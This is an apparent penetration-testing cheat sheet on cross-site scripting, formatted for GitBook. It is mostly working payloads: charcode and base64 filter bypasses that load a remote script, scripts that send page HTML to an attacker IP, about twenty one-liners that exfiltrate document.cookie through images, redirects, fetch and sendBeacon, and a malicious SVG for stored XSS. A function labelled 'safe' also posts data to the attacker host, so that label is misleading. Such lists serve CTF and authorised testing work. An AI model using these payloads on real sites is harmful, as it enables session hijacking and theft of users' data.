---
icon: spider-black-widow
description: Cross-site Scripting
---

# XSS

{% hint style="info" %}
## <mark style="color:purple;">Methodology</mark>

* [ ] <mark style="color:purple;">Look if any value you control is being reflected in the</mark> <mark style="color:orange;">**`HTML`**</mark> <mark style="color:purple;">or used by</mark> <mark style="color:orange;">**`Javascript`**</mark> <mark style="color:purple;">code.</mark>
* [ ] <mark style="color:purple;">**Find the context**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">where it's</mark> <mark style="color:orange;">**`reflected/used`**</mark><mark style="color:purple;">.</mark>

***

### <mark style="color:purple;">Reflected XSS</mark>

*


{% endhint %}

***

{% hint style="info" %}
### <mark style="color:purple;">Test Filters</mark>

#### <mark style="color:red;">`External Requests`</mark>

* <mark style="color:purple;">Test if the web application allows the inclusion of resources from external servers:</mark>
  1. <mark style="color:purple;">Spawn a</mark> <mark style="color:orange;">**`HTTP`**</mark> <mark style="color:purple;">server</mark>  <mark style="color:orange;">**`python3 -m http.server 80`**</mark>
  2. <mark style="color:purple;">Submit the payload and wait for the request</mark> <mark style="color:orange;">**`<img src='http://10.10.14.30/test.jpg' />`**</mark>

***

#### <mark style="color:red;">`Code Execution`</mark>

```javascript
<script>alert('XSS')</script>
```

```javascript
<img src="x` `<script>javascript:alert(1)</script>"` `>
```

#### <mark style="color:red;">`Charcode Bypass`</mark>

* <mark style="color:purple;">First use</mark> <mark style="color:green;">**`python`**</mark> <mark style="color:purple;">to convert the payload to integers:</mark>

{% code overflow="wrap" %}
```python
python3 -c "print(','.join([str(ord(c)) for c in '''document.write('<script src=\"http://10.10.16.8/tokyo.js\"></script>');''']))"
```
{% endcode %}

* <mark style="color:purple;">Now make the payload:</mark>

{% code overflow="wrap" %}
```javascript
<img src="x/><script>eval(String.fromCharCode(CHARCODE_HERE));</script>">
```
{% endcode %}

* <mark style="color:purple;">If you get a respond on the server you can try to steal data by creating the malicious files.</mark>
{% endhint %}

***

{% hint style="danger" %}
### <mark style="color:purple;">Stealers</mark>

### <mark style="color:orange;">`Reflected XSS`</mark>

* <mark style="color:purple;">Capture the</mark> <mark style="color:orange;">**`Full HTML`**</mark> <mark style="color:purple;">content of a web page:</mark>

{% code overflow="wrap" %}
```javascript
var req=new XMLHttpRequest();
req.open('GET', 'http://10.10.16.8:4444/?tokyo=' + btoa(document.body.innerHTML), true);
req.send();
```
{% endcode %}

* <mark style="color:purple;">Once the full content is captured you can target a specific element or section of the page:</mark>

{% code overflow="wrap" %}
```javascript
function getElement() {
	var req1=new XMLHttpRequest(); 
	req1.open('GET', '#admin' , true); //Swap #admin for your desired element
	req1.onreadystatechange = function () { 
		if (req1.readyState === req1.DONE) {
			if (req1.status === 200) { 
				 var req2=new XMLHttpRequest(); 
				req2.open('GET', 'http://10.10.16.8:4444?tokyo=' + btoa(req1.responseText), true);
				req2.send(); 
				}
			}
		}; 
	req1.send();
}

getElement();
```
{% endcode %}

* <mark style="color:purple;">You can also steals cookies that may been stored in the</mark> <mark style="color:orange;">**`DOM`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```javascript
window.addEventListener('DOMContentLoaded', function(e) {
    window.location = "http://10.10.16.8:4444/?tokyo=" + encodeURI(document.getElementsByName("cookie")[0].value)
})
```
{% endcode %}

* <mark style="color:purple;">In this code,</mark> <mark style="color:orange;">**`safeContentGrab`**</mark> <mark style="color:purple;">safely fetches & encodes content,</mark> <mark style="color:orange;">**`cookieExample`**</mark> <mark style="color:purple;">shows correct cookie access; contrast with direct</mark> <mark style="color:orange;">**`XSS`**</mark> <mark style="color:purple;">payload execution in</mark> <mark style="color:orange;">**`CTF`**</mark> <mark style="color:purple;">scenarios.</mark>

{% code overflow="wrap" %}
```javascript
function safeContentGrab() {
    var req = new XMLHttpRequest();
    req.open('GET', 'http://example.com', true);
    req.onload = function() {
        if (req.status === 200) {
            var encodedData = btoa(req.responseText);
            console.log('Encoded:', encodedData);
             var sendReq = new XMLHttpRequest();
             sendReq.open('POST', 'http://10.10.16.8:4444/', true);
             sendReq.send('tokyo=' + encodedData);
        }
    };
    req.send();
}

function cookieExample() {
    document.cookie = "testCookie=exampleValue; SameSite=Lax";
    var allCookies = document.cookie;
    console.log('All cookies:', allCookies);
}

safeContentGrab();
cookieExample();
```
{% endcode %}
{% endhint %}

***

{% hint style="danger" %}
## <mark style="color:purple;">Stealing Cookies</mark>

### <mark style="color:purple;">Key Condition -></mark> <mark style="color:orange;">**`HttpOnly`**</mark> <mark style="color:purple;">needs to be set to</mark> <mark style="color:orange;">**`false`**</mark>&#x20;

* <mark style="color:purple;">Use when injecting into an image tag where an</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**error event triggers(**</mark><mark style="color:orange;">**`HTTP response error or broken link`**</mark><mark style="color:purple;">**):**</mark>

{% code overflow="wrap" %}
```html
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
```
{% endcode %}

* <mark style="color:purple;">Use when you can inject an image and trigger a redirect via the</mark> <mark style="color:orange;">**`onerror`**</mark> <mark style="color:purple;">event(</mark><mark style="color:orange;">**`load error`**</mark><mark style="color:purple;">):</mark>

{% code overflow="wrap" %}
```html
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
```
{% endcode %}

* <mark style="color:purple;">Use in situations where you can send cookies via an image request (</mark><mark style="color:orange;">**`URL encoding`**</mark><mark style="color:purple;">):</mark>

{% code overflow="wrap" %}
```html
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
```
{% endcode %}

* <mark style="color:purple;">Use when</mark>  <mark style="color:purple;"></mark><mark style="color:purple;">you need to send cookies using an</mark> <mark style="color:orange;">**`audio object`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```html
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
```
{% endcode %}

* <mark style="color:purple;">Use when you</mark> <mark style="color:orange;">**`want to redirect`**</mark> <mark style="color:purple;">the user to a server with the cookies attached:</mark>

{% code overflow="wrap" %}
```html
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
```
{% endcode %}

* <mark style="color:purple;">Similar to the previous one; use when you</mark>  <mark style="color:orange;">**`want to redirect`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```html
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
```
{% endcode %}

* <mark style="color:purple;">Use in scenarios where you can  modify the</mark> <mark style="color:orange;">**`document.location`**</mark> <mark style="color:purple;">and send cookies:</mark>

{% code overflow="wrap" %}
```html
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
```
{% endcode %}

* <mark style="color:purple;">Inject when you need to send cookies via</mark> <mark style="color:orange;">**`document.location.href`**</mark> <mark style="color:purple;">and trigger a</mark> <mark style="color:orange;">**`redirect`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```html
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
```
{% endcode %}

* <mark style="color:purple;">Use to</mark> <mark style="color:orange;">**`dynamically write an image`**</mark> <mark style="color:purple;">that sends cookies:</mark>

{% code overflow="wrap" %}
```bash
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
```
{% endcode %}

* <mark style="color:purple;">Use when  you need to</mark> <mark style="color:orange;">**`assign a location redirect`**</mark> <mark style="color:purple;">with cookies:</mark>

{% code overflow="wrap" %}
```html
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
```
{% endcode %}

* <mark style="color:purple;">Similar to the previous one, use when you need to access</mark> <mark style="color:orange;">**`window.location`**</mark> <mark style="color:purple;">properties dynamically:</mark>

{% code overflow="wrap" %}
```html
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
```
{% endcode %}

* <mark style="color:purple;">Use when you need to modify</mark> <mark style="color:orange;">**`window.location.href`**</mark> <mark style="color:purple;">dynamically:</mark>

{% code overflow="wrap" %}
```html
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
```
{% endcode %}

* <mark style="color:purple;">Use when you can</mark> <mark style="color:orange;">**`dynamically join the URL and cookies to redirect`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```html
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
```
{% endcode %}

* <mark style="color:purple;">Use when you can send cookies using an</mark> <mark style="color:orange;">**`image object`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```html
<script>var i=new Image(); i.src="http://10.10.14.6/?c="+document.cookie;</script>
```
{% endcode %}

* <mark style="color:purple;">Use when you need to</mark> <mark style="color:orange;">**`redirect with concatenation of cookies`**</mark> <mark style="color:purple;">into a URL:</mark>

{% code overflow="wrap" %}
```html
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
```
{% endcode %}

* <mark style="color:purple;">Use in scenarios where you can send cookies via an</mark> <mark style="color:orange;">**`XMLHttpRequest`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```html
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
```
{% endcode %}

* <mark style="color:purple;">Use when you can inject</mark> <mark style="color:orange;">**`base64-encoded JavaScript`**</mark> <mark style="color:purple;">and execute it to send cookies:</mark>

{% code overflow="wrap" %}
```html
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
```
{% endcode %}

* <mark style="color:purple;">Use when you need to send cookies via</mark> <mark style="color:orange;">**`fetch`**</mark> <mark style="color:purple;">with</mark> <mark style="color:orange;">**`no-cors`**</mark> <mark style="color:purple;">mode to</mark> <mark style="color:orange;">**`avoid response handling`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```html
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
```
{% endcode %}

* <mark style="color:purple;">Use when you want to send cookies</mark> <mark style="color:orange;">**`asynchronously`**</mark> <mark style="color:purple;">in the background using the</mark> <mark style="color:orange;">**`sendBeacon`**</mark> <mark style="color:purple;">API, typically for stealthier attacks.</mark>

{% code overflow="wrap" %}
```html
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
{% endcode %}
{% endhint %}

***

{% hint style="danger" %}
### <mark style="color:purple;">`Stored XSS`</mark>

* <mark style="color:purple;">Create a malicious</mark> <mark style="color:orange;">**`SVG`**</mark> <mark style="color:purple;">file to test image uploading features</mark>

{% code overflow="wrap" %}
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert("XSS by BHARAT");
  </script>
</svg>
```
{% endcode %}
{% endhint %}

